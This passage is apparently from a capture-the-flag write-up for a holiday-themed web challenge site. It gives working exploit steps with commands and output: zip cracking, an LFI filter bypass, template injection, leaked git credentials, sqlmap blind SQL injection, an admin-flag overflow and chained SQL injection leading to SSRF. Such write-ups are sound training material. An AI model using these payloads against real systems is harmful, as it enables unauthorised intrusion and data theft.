john --wordlist=/usr/share/wordlists/rockyou.txt zippass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hahahaha         (my_secure_files_not_for_you.zip)
1g 0:00:00:00 DONE (2020-12-29 11:21) 25.00g/s 409600p/s 409600c/s 409600C/s 123456..cocoliso
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Seems like `hahahaha` is the password we're looking for. Providing that as a password when extracting `flag.txt` from the zip-file gives us access to the fifth flag `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`: 
{F1138491}


## /my-diary - the sixth flag
Seems like the Grinch has been keeping a diary - I wonder if he's written anything about his upcoming plans to ruin Christmas for everyone?

{F1138492}

A first look doesn't reveal anything of particular interest bar the fact that he is planning to ruin Christmas on the 25th... Oh, and it seems as if his diary might be vulnerable to LFI attacks since the address bar looks like this:
{F1138494}

Let's see what happens if we try to include `index.php` by visiting https://hackyholidays.h1ctf.com/my-diary/index.php?template=index.php:
{F1138493}

A blank page. Huh. But is it, though? Let's have a look at the Networks tab of the browser:

{F1138495}

Turns out, the page is vulnerable to LFI and we have gotten the source code of the `index.php` file.

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

By the looks of it, there is a secret admin page located at `https://hackyholidays.h1ctf.com/my-diary/secretadmin.php`. Unfortunately, the file isn't directly accessible:
{F1138496}
And trying to have `index.php` retrieve it through the `template` parameter seems undoa... No, it should actually be doable given the right string composition.

First up, the webpage filters anything that is not part of the charset 
```javascript
/[A-Za-z0-9.]/
```
As such, we are limited to A-Z, a-z, 0-9 and .

Next, using `str_replace` it removes `admin.php`, followed by removing any occurrences of `secretadmin.php`. This approach seems secure but it is not - PHP does an initial search of all occurrences  of `admin.php` and then only removes those before doing the same thing for `secretadmin.php`! 

The PHP documentation for [str_replace](https://php.net/str_replace) states the following:
{F1138497}

This means that if we put, say, `adminadmin.php.php` through the filter `str_replace("admin.php", "", $page)`, we will be left with `admin.php`. We can quickly confirm this is the case by running the following PHP code by using `php -a`

```php
php > $a = "adminadmin.php.php";
php > print str_replace("admin.php", "", $a);
admin.php
```

As such, we can construct the following string to avoid all filters: `secretsecretadminadmin.php.phpadminadmin.php.php`

```php
php > $a = "secretsecretadminadmin.php.phpadminadmin.php.php";
php > print str_replace("secretadmin.php", "", str_replace("admin.php", "", $a));
secretadmin.php
```

By visiting https://hackyholidays.h1ctf.com/my-diary/index.php?template=secretsecretadminadmin.php.phpadminadmin.php.php we get the contents of the `secretadmin.php` file, including the sixth flag `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`:
{F1138499}

Also, it seems the Grinch is planning to DDoS Santa's servers on the 23rd!

## /hate-mail-generator - the seventh flag
Apparently, the Grinch has been hard at work trying to upset people by sending them hate mail. The initial page looks like below and has a single campaign:
{F1138501}

The campaign itself looks like so:
{F1138500}

Looks like he's using a template engine to include HTML files in his outgoing hate mail - let's leave this potential SSTI for now and come back to it later.

We can create our own campaign by clicking on the [Create New](https://hackyholidays.h1ctf.com/hate-mail-generator/new) button on the front page. The `New Campaign` page looks like so:
{F1138502}
with source code as follows (irrelevant outer markup omitted):
```html
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">New Campaign</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                       <form method="post">
            <div class="panel panel-default" style="margin-top:50px">
                <div class="panel-heading">New Campaign</div>
                <div class="panel-body">
                    <div><label>Name:</label></div>
                    <div><input class="form-control" name="name" value=""></div>
                    <div style="margin-top:7px"><label>Subject:</label></div>
                    <div><input class="form-control" name="subject"></div>
                    <div style="margin-top:7px"><label>Markup:</label></div>
                    <div><textarea name="markup" class="form-control" rows="15">Hello {{name}} ....</textarea></div>
                </div>
            </div>
            <div>
                <input type="button" class="btn btn-primary preview-campaign" value="Preview">
                <input type="submit" class="btn btn-success pull-right" value="Create">
            </div>
            </form>
        </div>
    </div>
</div>
<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
    <input type="hidden" name="preview_markup">
    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
</form>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $('.preview-campaign').click( function(){
        $('input[name="preview_markup"]').val( $('textarea[name="markup"]').val(  ) )
        $('form#previewfrm').submit();
    });
</script>
```

Apparently, if we preview the page ([link](https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview)) we will do so using mockup name and email for 'Alice' (alice@test.com). Previewing the premade mail template, it does say hello to Alice:
{F1138503}

Knowing that we can inject random data through `{{}}` and actually have the page process it through the preview function, let's see what juicy files we can dig up to use with `{{template:}}` .

Let's fuzz!
```bash
ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Templates looks to be just what we're looking for!
```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
<html>
<head><title>Index of /hate-mail-generator/templates/</title></head>
<body bgcolor="white">
<h1>Index of /hate-mail-generator/templates/</h1><hr><pre><a href="../">../</a>
<a href="cbdj3_grinch_header.html">cbdj3_grinch_header.html</a>                                     20-Apr-2020 10:00                   -
<a href="cbdj3_grinch_footer.html">cbdj3_grinch_footer.html</a>                                     20-Apr-2020 10:00                   -
<a href="38dhs_admins_only_header.html">38dhs_admins_only_header.html</a>                                21-Apr-2020 15:29                  46
</pre><hr></body>
</html>
```

Nice, a list of usable templates. Naturally, we'll try accessing `38dhs_admins_only_header.html` first:
```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.15.8</center>
</body>
</html>
```

Well, I don't think anyone actually expected that to work. Let's get back to the new campaign page at `/hate-mail-generator/new` and see what we can cook up!

{F1138504}

Let's preview and win!
{F1138505}

SUCCE... ?! What? Apparently, not so easy. But, we know the two parameters to the preview function - `preview_markup`and `preview_data` from the source code of the `new` page. Maybe we can trick the page into including the admin-page by providing it as a variable in `preview_data` and then reflecting that variable in `preview_markup`. Let's craft `preview_data` to look like so:
```json
{
  "name":"Alice",
  "email":"alice@test.com",
  "winner":"{{template:38dhs_admins_only_header.html}}"
}
 ```

Next, let's modify `preview_markup` to include our new `winner` property:
```text
{{winner}}
```

Let's run the request using the following JavaScript from the debug console (press F12) on https://hackyholidays.h1ctf.com/hate-mail-generator/:
```javascript
const previewData = '{"name":"Alice","email":"alice@test.com","winner":"{{template:38dhs_admins_only_header.html}}"}';
const previewMarkup = '{{winner}}';

const formData = new FormData();
formData.append('preview_markup', previewMarkup);
formData.append('preview_data', previewData);
const body = new URLSearchParams(formData);

fetch('https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview', { method: 'POST', body: new URLSearchParams(formData), headers: { 'content-type':'application/x-www-form-urlencoded'} }).then(d => d.text()).then(d => console.log(d));
```

This gives us the following response, including the seventh flag `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`: 
```html
<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

Sweet! While we haven't really stopped any emails from going out, we have at least managed to access the admin page!

## /forum - the eight flag
Ah yes, because what webpage is complete without a forum to gloat in! There doesn't seem to be anyone active in the forums except for the Grinch himself and Max the dog, though ...

{F1138506}

Looking through the forums and fuzzing `https://hackyholidays.h1ctf.com/forum/` doesn't actually reveal anything interesting apart from a `/phpmyadmin` endpoint that seems to be completely unwilling to do anything without proper papers...

```bash
ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

Enter twitter:
{F1138507}
Until I saw this tweet, I had no idea about who had actually created the CTF but this gave me an idea - maybe, just maybe, the source is available on GitHub. Let's have a look!

Searching google for `site:github.com adamtlangley grinch` gives a single result:
{F1138509}

\* **An hour of source code review later** * 

The forums don't seem to be vulnerable to any particular type of attack, and I can't find any vector to defeat the session hash without actually having an account. Looking at the source for the DB class, I noticed there was no user or password specified for accessing the database.

```php
class Db {

    static private $read = '';
    static private $write = '';

    /**
     * @return PDO
     */
    static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }

    public static function closeAll(){
        self::$read = null;
        self::$write = null;
    }

    /**
     * @return PDO
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
}
```

Strange, I thought to myself...  Maybe they entered them later, straight on the server? Or maybe... they have a previous commit disclosing the information?!
{F1138510}

Aha! Looking at the older commit ('Initial Code Commit'), bingo:
```php
static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
        }
        return self::$read;
    }
```

We know from the `DB::__construct` method that the order is `$write, $db, $db_user, $db_pass`:
```php
public function __construct($write, $db, $db_user, $db_pass ){
        $this->write = $write;
        $this->db = $db;
        $this->db_user = $db_user;
        $this->db_pass = $db_pass;
        $this->reconnect();
    }
```

Plugging "our" credentials into the login box at https://hackyholidays.h1ctf.com/forum/phpmyadmin, we are shown the following page detailing database structure:
{F1138511}

Only the `user` table actually returns any data of interest:
{F1138512}

Hmm, looks like the passwords might be MD5-hashed... Let's plug the Grinch's password hash into [CrackStation](crackstation.net):
{F1138513}

Sweet, his password is `BahHumbug`. Now let's log into the forums from https://hackyholidays.h1ctf.com/forum/login using `grinch:BahHumbug` as our credentials:
{F1138514}

{F1138515}

Oh no, it seems like the Grinch is really going to go through with DDoSing Santa!

At least we got the eight flag, `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.

## /evil-quiz - the ninth flag
As the name implies, the quiz is evil. To the untrained (my) eye, it is just another webpage quiz. You can (I did) spend hours upon hours staring at until it dawns on you (me) that there is something peculiar about how many other players of the same name there are participating in the quiz...

{F1138516}

After testing about with SQLi, XSS, brute force on the admin login, trying to forge and guess session variables and what not, I noticed this interesting part on the score page after updating my name with some random SQLi (`myuniquename' or 1=1 -- `):

{F1138517}

Huh, seems like we have ourselves an SQLi that might be used as a boolean. Let's confirm by altering the name to `myuniquename' or 1=2 -- `:
{F1138518}

Yup, definitely is vulnerable to a blind boolean based SQLi. I saved the HTTP POST request to `https://hackyholidays.h1ctf.com/evil-quiz` used to set the name variable from Burp suite as `quiz.req` and fired up sqlmap with the following options (note: sqlmap needs the request to have the cookie `session` set to a hash that has completed the quiz at least once!):

```bash
sqlmap -r ../quiz.req --second-url=https://hackyholidays.h1ctf.com/evil-quiz/score --level=5 --risk=3 --not-string=" 0 other" -p name --dbs --tables --thread=4
```

Basically, we tell sqlmap to inject through the `name` parameter and then check the URL supplied through `--second-url` for results, using the string ` 0 other` as the string to look for to determine a `false` response. Anything else will be regarded as a `true`response. sqlmap will also ask whether to follow redirects and if it should merge cookies -  answering no is the right way to go.

Quite a few 502s and 500s later, sqlmap finally reports that there are two tables in a database named `quiz`:
```bash
[09:33:59] [INFO] retrieved: quiz
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+
```

Not really interested in the actual quiz anymore, let's have a look at the contents of `admin` by adding the switches `-D quiz -T admin` :
```bash
Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```

Entering our credentials into the login box for the admin section at https://hackyholidays.h1ctf.com/evil-quiz/admin, we are greeted with the ninth flag `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`:

{F1138519}


## /signup-manager - the tenth flag
Oh no, the Grinch is trying to recruit people who hate Christmas! (who signs up for this?! ... oh right, I did). 
{F1138520}

Anyway, signing up with a random user doesn't give us much:
{F1138521}

Checking for SQLi, XSS etc again gives nothing - not even XXE works. Shoot. Ah well, let's have a look at the source code, then.

{F1138522}
?!
Surely, the Grinch wouldn't have forgotten the README.md file in place? Must. Check. 
(https://hackyholidays.h1ctf.com/signup-manager/README.md)
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Turns out, he did leave it in place - and it has credentials! It also tells us all users are saved to a textfile and that the very last character for each user's entry in `users.txt` determines whether they are an admin or not - `Y` for admin, otherwise `N`.
However, the default credentials `admin:password` do not work. Maybe the `users.txt` file has also been left in place?
{F1138524}

Nope... What about the source code then, supposedly contained in `signupmanager.zip`? It is indeed available to us and contains the following files:
(https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip)
{F1138523}

`admin.php` seems interesting  but doesn't actually have anything of value for us. Looking through the rest of the files, it quickly becomes evident that only `index.php` is of any interest to us. In particular, it has all the code for the sign up process and explicitly pads the string to be saved in `users.txt` to a fixed length and ensures the last letter will be `N` to deprive us of admin privileges. The relevant code for adding users is:
```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
[...]
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
```

At first sight, there doesn't seem to be any way to coerce the application into giving us admin privileges - all inputs are being forced to specific lengths by either `substr` (`username`, `firstname`, `lastname`) followed by `str_pad`, by MD5 hashing (`password`), or by simple `strlen`check (`age`).

The `addUser` function then ensures fixed length so that the final string entered into `users.txt` is exactly 113 in length. There is just one parameter that sticks out here - `age`.

While the page certainly ensures it is no longer than 3 in length, computers in general allow for expansion by using `e` notation - `1e3` will become `1000`. PHP's `is_numeric` accepts this notation and it will later be expanded past the imposed length limit.

Knowing this, we can craft the following POST data in Burp and POST it to `https://hackyholidays.h1ctf.com/signup-manager/`:
```http
action=signup&
username=ayayay&
password=ayayay&
age=1e3&
firstname=ayayay&
lastname=YYYYYYYYYYYYYYY
```
{F1138617}

Do note, `lastname`'s 15th character must be an uppercase `Y`. The `1e3` will expand into `1000` thus making the final string to enter `users.txt`:
`ayayay#########8f74d2d878f454edb5dd310d198af797c4ca4238a0b923820dcc509a6f75849b1000ayayay#########YYYYYYYYYYYYYYY` (or similar - the hash for session will differ)

This creates an admin user for us and when we log in with the above credentials, we will be greeted by the following screen and the tenth flag `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`:
{F1138528}

We also receive a link to our next task - the 11th flag!

## r3c0n_server_4fdk59/ - the 11th flag
Turns out the Grinch has been doing 'recon' on Santa's activities since 2018 and uploaded evidence of his criminal conduct to the internet. Tsk tsk.

{F1138529}

The album links lead to pages with photos:
{F1138531}

The first page tells us there is an API in development but not much more. Fuzzing the url `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/` doesn't really much except confirming there is, in fact, an endpoint under `api/`:
```bash
ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1] (false positive, hurr)
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
```
{F1138530}

It tells us there are a bunch of status codes but not much else... Fuzzing `r3c0n_server_4fdk59/api/` gives us a whole lot of 401s - literally anything is a 401 under `api/` -  and just about nothing else... Well, it does tell us it's probably because we are coming from the wrong IP, so let's see if we can find some SSRF or other vulnerabilities.

Just for the sake of it, let's also run sqlmap on whatever we find.

Inspecting the first page with the album links tells us they point to `album?hash=HASHVALUE` [example](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k)

Trying to decode the hashes gave nothing, so let's go ahead with sqlmap:
```bash
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs
[...]
[14:52:35] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] recon
```

So it's vulnerable, let's enumerate the `recon` database:
```bash
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -D recon --tables
[...]
[14:53:50] [INFO] fetching tables for database: 'recon'
Database: recon
[2 tables]
+-------+
| album |
| photo |
+-------+
```

Dumping them gives the following information:
```mysql
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

Hmm, nothing really interesting here. Let's have a look at how pictures are loaded.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9

Now that's more interesting! While the `picture` endpoint's `data` parameter doesn't seem to be vulnerable to SQLi, its contents look base64 encoded:
```javascript
atob(`eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`);
```
```json
{
  "image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg",
  "auth":"e934f4407a9df9fd272cdb9c397f673f"
}
```

Sweet, looks like there might be some sort of SSRF and a leaked auth-hash! Also, we know uploaded pictures go in `uploads/`. Let's try to access some really common API endpoint, like `api/user`, right away!
```javascript
let e = btoa('{"image":"r3c0n_server_4fdk59\/api\/user","auth":"e934f4407a9df9fd272cdb9c397f673f"}');
fetch(`/r3c0n_server_4fdk59/picture?data=${e}`).then(d => d.text()).then(d => console.log(d));
```
Wonder what nice stuff we'll get back now!
```text
invalid authentication hash
```
... I should have known. Seems like the `auth` part of the JSON object is used to check the contents of `image`. We can add any arbitrary properties we'd like to the JSON object, and as long as we don't fiddle with `image` and `auth`, the `/picture` endpoint will happily  accept it.

\* **Several days of trying to figure out how the `auth` hash is encoded, hashed, encrypted etc later** *

I got ... nothing. Let's go over the SQLi on the `hash` param - maybe we can influence the pictures displayed... 

Looking back at the album and photo tables, the query is likely to select three columns so let's try with a UNION attack and see if we can get photos from 2020 without using the hash `jdh34k`. Since we know the album id is `3`, we can construct the following  SQLi:

```javascript
sql = `' union all select "3", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
Gives us this link https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223%22,%203,%20'test'%20--%20 resulting in this page:
{F1138533}

Yup, we can fetch whatever album we'd like without using the hash. So what?

\* **Several hours spent trying to find ways to priv esc the database or random files through `uploads/` later** *

Back to the SQLi again. Maybe we can do a double union? I mean, we have found nothing else, and it's definitely fetching the pictures out of the database before displaying them. Let's see if we can construct an SQLi on the album id fetched from the database and affect the photo filename, the third column, loaded out of photos when the album page goes to load those from the DB:
```javascript
// this query assumes the /album first fetches the album id using hash
// and then plugs that album id into a query to fetch any relevant photos
// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
// this in turn will give us another row fetched where the photo url will include waffle
sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
Gives us this link https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'waffle%20--%20'%20--%20%22,%203,%20'test'%20--%20 which includes a picture that can't be displayed!

Opening the link directly results in this:

{F1138535}

The missing image link's data payload decodes to:
```javascript
atob("eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3dhZmZsZSAtLSAiLCJhdXRoIjoiNGYwNzdlYjJhZDJmYzI3Y2Q5ZGVlMmJmZGE3NjNiZDcifQ==");
"{
  "image":"r3c0n_server_4fdk59\/uploads\/waffle -- ",
  "auth":"4f077eb2ad2fc27cd9dee2bfda763bd7"
}"
```

Following the [link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3dhZmZsZSAtLSAiLCJhdXRoIjoiNGYwNzdlYjJhZDJmYzI3Y2Q5ZGVlMmJmZGE3NjNiZDcifQ==), we are presented with the following message:

{F1138534}

Since it isn't a raw 404, it looks like `picture` really tried to read `waffle` from uploads. Apparently, the server has calculated the `auth` property for us and we have successfully achieved SSRF! Using the same method, let's see if we can access the API now by trying `api/user` again:
```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'../api/user'%20--%20%22,%203,%20'test'%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==)
{F1138662}

Nope. Perhaps we need to specify a user? Let's try appending `?id=1`

```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'../api/user?id=1'%20--%20%22,%203,%20'test'%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/aWQ9MSIsImF1dGgiOiI5ODZhNDA5ODY3ZDljYmVlOTVmZDg1MDFmYmEwMTFmMyJ9)
{F1138536}

Referencing the previous table for API status codes, `id` apparently isn't valid. Bah, let's fuzz it. 

\* **Several hours of intense script writing later** *

Armed with a node.js script, we can now automate visiting links and gathering data, thus enabling fuzzing. The script is nothing fancy and is basically the previously mentioned encoding combined with fetch, accessible from the command line for ease of use.

Fuzzing for parameters, I find that the `user` endpoint accepts `username` and `password` (and `0`, which in hindsight probably is just the start of some other parameter I didn't find).

\* **Several hours spent passionately trying to brute-force `username` and `password` later** *

Empty handed, I start looking for other endpoints and discover two more by fuzzing: `ping` and `sleep`. Both return `Invalid content type` when accessed through `picture` payloads. Huh. Normally at least the `ping` endpoint would return data - maybe the `picture` endpoint expects actual image data? None the wiser, I again go back through the recon challenge, checking for missed things. Not sure exactly why, but for some reason, my mind gets stuck on SQLi. Since we have already had two layers of SQLi, maybe there's another? Maybe we can extract a user by shoving a `%` in the `username` parameter, combining it with the error message (invalid content type) from `picture`? Might as well try!

Change the user part of the SQLi to `user?username=%` and generate the links like before:
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20union%20all%20select%20%223%27%20union%20all%20select%201,%202,%20%27../api/user?username=%25%27%20--%20%22,%203,%20%27test%27%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9)
{F1138662}
If there is another SQLi, this is definitely in line with how `ping` behaves - maybe we can use it as a boolean and extract the username? Let's try `a%`:
`Expected HTTP status 200, Received: 204`
{F1138667}
[same procedure for b-f, all resulting in "Received: 204"]
`g%`:
{F1138662}
Oh, looks like it is usable and the first letter of username is a lowercase `g`!

\* **Intense script writing resumes - adding username and password brute-forcing to the script** *

Letting the script run, it finally discovers that the `username` is likely to be `grinchadmin` and the password `s4nt4sucks`.

Plugging these into the login box at `https://hackyholidays.h1ctf.com/attack-box/` leads us to this page and the 11th flag `flag{07a03135-9778-4dee-a83c-7ec330728e72}`:
{F1138538}

At long last, the 11th flag! But wait, the Grinch is going to DDoS Santa's servers (as we know) and his underlings have finished preparing the target setup!

## attack-box/ - the 12th and final flag
Ooooookay, we need to stop this now. Before it's too late (hey, those buttons...). Need to protect Christmas (they look kinda nice)! 

Maybe... No... I must click them!

{F1138539}

Sorry Santa! Fortunately, it seems Santa's infrastructure isn't so easily overpowered (phew!).

So, how to go about this then... As one would guess, fuzzing gives nothing! Yup. No surprises there, not even coal. Let's have another look at those buttons (no touching!).

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Apparently, they point to `launch` which accepts a base64 string through the `payload` parameter. Decoding the parameter gives us the following object:
```javascript
atob('eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==');
```
```json
{
  "target":"203.0.113.33",
